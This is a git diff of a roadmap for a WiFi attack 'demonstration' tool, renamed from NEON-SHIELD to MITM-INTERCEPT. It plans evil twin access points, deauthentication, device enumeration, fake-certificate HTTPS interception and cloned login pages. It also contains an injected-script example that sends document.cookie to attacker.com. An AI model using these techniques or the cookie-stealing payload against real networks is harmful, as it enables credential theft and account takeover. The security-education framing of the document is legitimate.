@@ -1,8 +1,8 @@
-# 🎯 NEON-SHIELD Strategic Roadmap
+# 🎯 MITM-INTERCEPT Strategic Roadmap
 
 ## Executive Summary
 
-NEON-SHIELD is evolving from a **single-network MITM proxy** into a **comprehensive cyber-attack demonstration platform** that teaches users why network security matters by showing real-world threats they face every day.
+MITM-INTERCEPT is evolving from a **single-network MITM proxy** into a **comprehensive cyber-attack demonstration platform** that teaches users why network security matters by showing real-world threats they face every day.
 
 **Key Principle:** Every feature demonstrates a real-world threat, with clear educational framing showing:
 - **The Attack:** What the threat actor does
@@ -18,7 +18,7 @@ NEON-SHIELD is evolving from a **single-network MITM proxy** into a **comprehens
 
 ### ✅ Local Network ARP-Spoof MITM
 ```
-NEON-SHIELD v2.0 (Current)
+MITM-INTERCEPT v2.0 (Current)
 ├── ARP Spoofing on local LAN
 ├── Transparent HTTP/HTTPS interception
 ├── Traffic logging (every request)
@@ -47,7 +47,7 @@ Users learn: "If I connect to public WiFi without a VPN, anyone there can interc
 ## The Game Changer: Attack Devices NOT On Our Network But Within WiFi Range
 
 ### Why This is Powerful
-- **Current limitation:** NEON-SHIELD only works on devices already on our LAN
+- **Current limitation:** MITM-INTERCEPT only works on devices already on our LAN
 - **Real threat:** Attackers can target ANY device in WiFi range, even if not connected to their network yet
 - **Scarier demo:** "I can attack your phone from across the coffee shop without being on your WiFi"
 
@@ -56,28 +56,28 @@ Users learn: "If I connect to public WiFi without a VPN, anyone there can interc
 ## 1A. Evil Twin Rogue Access Point (Foundation)
 
 ### The Concept
-Instead of ARP-spoofing on an existing network, **NEON-SHIELD becomes the WiFi router itself**.
+Instead of ARP-spoofing on an existing network, **MITM-INTERCEPT becomes the WiFi router itself**.
 
 ```
 Normal WiFi Ecosystem:
   Real Starbucks WiFi (192.168.1.1) ← devices connect here
   
-NEON-SHIELD Evil Twin:
-  Fake "Starbucks WiFi" (192.168.100.1) ← NEON-SHIELD acts as router
+MITM-INTERCEPT Evil Twin:
+  Fake "Starbucks WiFi" (192.168.100.1) ← MITM-INTERCEPT acts as router
   All devices think they're connecting to real Starbucks
-  NEON-SHIELD intercepts ALL traffic
+  MITM-INTERCEPT intercepts ALL traffic
 ```
 
 ### Why This Works
 1. **Users see familiar WiFi name** (Starbucks_WiFi, Airport_Free, etc)
 2. **No password needed** (or same password as real network)
 3. **Device auto-connects** (many phones auto-connect to previously seen networks)
-4. **NEON-SHIELD is now the Man-in-the-Middle** for ALL that device's traffic
+4. **MITM-INTERCEPT is now the Man-in-the-Middle** for ALL that device's traffic
 
 ### Why We're Demonstrating This
 - **Real Threat:** This is how attackers actually target people in public spaces
 - **Scariest Part:** Users don't realize they're on fake WiFi
-- **Silent Interception:** All HTTPS still looks "secure" because NEON-SHIELD has fake certs
+- **Silent Interception:** All HTTPS still looks "secure" because MITM-INTERCEPT has fake certs
 - **No Device Config Needed:** Unlike ARP spoof (which requires already being on the network)
 
 ### Real-World Impact
@@ -103,7 +103,7 @@ Coffee Shop Attacker Workflow:
 
 ### Implementation Details
 ```bash
-# NEON-SHIELD Evil Twin Mode
+# MITM-INTERCEPT Evil Twin Mode
 sudo python3 main_cli.py --ap-mode \
   --ssid "Starbucks_WiFi" \
   --channel 6 \
@@ -159,7 +159,7 @@ Attack Progression:
 
 ### Implementation
 ```bash
-# NEON-SHIELD Deauth Mode
+# MITM-INTERCEPT Deauth Mode
 sudo python3 main_cli.py --deauth \
   --target "nearby_device_mac" \
   --network "Starbucks_WiFi" \
@@ -167,7 +167,7 @@ sudo python3 main_cli.py --deauth \
 
 # Output: Deauth frames sent. Device disconnected.
 #         Waiting for reconnection...
-#         Device reconnected to NEON-SHIELD evil twin!
+#         Device reconnected to MITM-INTERCEPT evil twin!
 ```
 
 ---
@@ -213,7 +213,7 @@ Result: Captures all traffic from that network in plaintext
 
 ### Implementation
 ```bash
-# NEON-SHIELD Network Enumeration
+# MITM-INTERCEPT Network Enumeration
 sudo python3 main_cli.py --scan-networks \
   --interface wlan0 \
   --duration 30 \
@@ -248,7 +248,7 @@ Passively detect all devices within WiFi range by analyzing:
 
 ### Real-World Impact
 ```
-NEON-SHIELD Device Detection:
+MITM-INTERCEPT Device Detection:
 ├── Device #1 (Apple iPhone 14) is searching for:
 │   ├── "Starbucks_WiFi" (last 30 times user was at Starbucks)
 │   ├── "Home_WiFi" (home network)
@@ -278,7 +278,7 @@ Attacker now knows:
 
 ### Implementation
 ```bash
-# NEON-SHIELD Device Enumeration
+# MITM-INTERCEPT Device Enumeration
 sudo python3 main_cli.py --enumerate-devices \
   --interface wlan0 \
   --duration 60
@@ -365,7 +365,7 @@ Inject malicious code into web pages in real-time:
 Malware Injection Attack:
 1. User connects to attacker's evil twin WiFi
 2. User visits facebook.com
-3. NEON-SHIELD injects: <script>fetch('attacker.com/steal?data=' + document.cookie)</script>
+3. MITM-INTERCEPT injects: <script>fetch('attacker.com/steal?data=' + document.cookie)</script>
 4. Facebook loads normally (user doesn't notice)
 5. JavaScript silently runs, sends cookies to attacker
 6. Attacker steals session, gains access to user's account
@@ -400,14 +400,14 @@ Real Gmail Login:           → Cloned Gmail (Hosted by Attacker):
 
 ## Why This Works
 - Page looks identical to real page (simple HTML clone)
-- No SSL certificate error (on evil twin WiFi, NEON-SHIELD has fake cert)
+- No SSL certificate error (on evil twin WiFi, MITM-INTERCEPT has fake cert)
 - User thinks they're entering credentials into Google/Facebook
 - Attacker captures credentials in plaintext
 
 ## Why We're Demonstrating This
 - **Real Threat:** Phishing is the #1 attack vector for account takeover
 - **Effective:** Even tech-savvy users fall for cloned pages on public WiFi
-- **No Tech Skills Needed:** NEON-SHIELD can auto-generate clones
+- **No Tech Skills Needed:** MITM-INTERCEPT can auto-generate clones
 - **Demonstrates:** Why email verification, 2FA, and browser warnings matter
 
 ## Real-World Impact
@@ -547,7 +547,7 @@ Every feature should answer these questions:
 ### Phase 1 Demo: "From Across the Coffee Shop"
 ```
 Narrator: "I'm sitting in a Starbucks. I have my laptop. 
-I run ONE command with NEON-SHIELD."
+I run ONE command with MITM-INTERCEPT."
 
 [Command executes]
 
@@ -634,7 +634,7 @@ And most importantly: why public WiFi is dangerous."
 # 📢 Messaging Strategy
 
 ## Tagline
-**"NEON-SHIELD: Demonstrating why network security matters. Because threats aren't theoretical."**
+**"MITM-INTERCEPT: Demonstrating why network security matters. Because threats aren't theoretical."**
 
 ## Key Messages
 
@@ -664,7 +664,7 @@ And most importantly: why public WiFi is dangerous."
 Week 1-2: Core Rogue AP Implementation
 ├── Setup hostapd (WiFi AP software)
 ├── DHCP server (assign IPs to connected devices)
-├── DNS server (resolve all domains to NEON-SHIELD)
+├── DNS server (resolve all domains to MITM-INTERCEPT)
 ├── Traffic routing (funnel through proxy)
 └── Dashboard update (show connected devices)
 
@@ -734,7 +734,7 @@ Every feature includes:
 
 # 📝 Summary
 
-NEON-SHIELD evolves from a "single-network proxy" into a **comprehensive attack demonstration platform** that teaches cybersecurity through live, hands-on examples.
+MITM-INTERCEPT evolves from a "single-network proxy" into a **comprehensive attack demonstration platform** that teaches cybersecurity through live, hands-on examples.
 
 **Phase 1 (Rogue AP + Enumeration)** is the priority because it's:
 - **Most powerful:** Targets devices not on your network, just nearby
@@ -750,7 +750,7 @@ By the time we reach Phase 4-5, users will understand:
 - **Why modern TLS versions matter**
 - **Why they should never trust public WiFi**
 
-**NEON-SHIELD becomes a teaching tool that changes behavior.**
+**MITM-INTERCEPT becomes a teaching tool that changes behavior.**
 
 ---
 
